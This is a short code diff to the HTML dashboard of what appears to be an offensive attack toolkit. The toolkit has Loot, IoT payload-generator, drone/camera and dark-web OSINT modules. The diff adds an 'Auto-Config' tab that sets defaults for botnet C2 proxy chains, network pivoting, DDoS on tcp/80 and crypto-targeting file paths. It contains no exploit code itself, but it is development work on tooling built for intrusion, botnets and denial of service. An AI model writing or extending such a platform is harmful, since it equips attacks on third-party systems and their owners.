@@ -78,6 +78,7 @@ DASH_HTML = """<!doctype html>
   <button onclick="showModule('loot')">Loot</button>
   <button onclick="showModule('iot')">IoT</button>
   <button onclick="showModule('openfable')">OpenFable</button>
+  <button onclick="showModule('autoconfig')">Auto-Config</button>
 </div>
 
 <div id="home" class="module active">
@@ -306,6 +307,14 @@ darkowl: POST /api/osint/darkowl/search {query}</pre></div>
     <div class="card"><h2>Payload generator (POST /api/iot/payload {kind, params})</h2><pre id="iot-payload">…</pre></div>
     <div class="card"><h2>Drones + cameras + map</h2><pre id="iot-drones">…</pre></div>
   </div>
+</div>
+
+<div id="autoconfig" class="module">
+  <h2>Auto-Config (Host-Aware Defaults)</h2>
+  <p>Real OS/detection + dependency/network check sets best defaults per tool.</p>
+  <div class="card"><h3>Host Profile</h3><pre id="autoconfig-host">Detecting...</pre></div>
+  <div class="card"><h3>Tool Defaults</h3><pre id="autoconfig-defaults">Botnet → HTTPS / IoT / C2 proxy chain; Crypto → real file paths; ADB → USB debug; Pivot → subnet based on net_hint; DDOS → tcp/80</pre></div>
+  <button onclick="fetch('/api/autoconfig/dashboard').then(r=>r.json()).then(d=>document.getElementById('autoconfig-host').textContent=JSON.stringify(d.host_profile,null,2))">Refresh</button>
 </div>
 
 <div id="openfable" class="module">
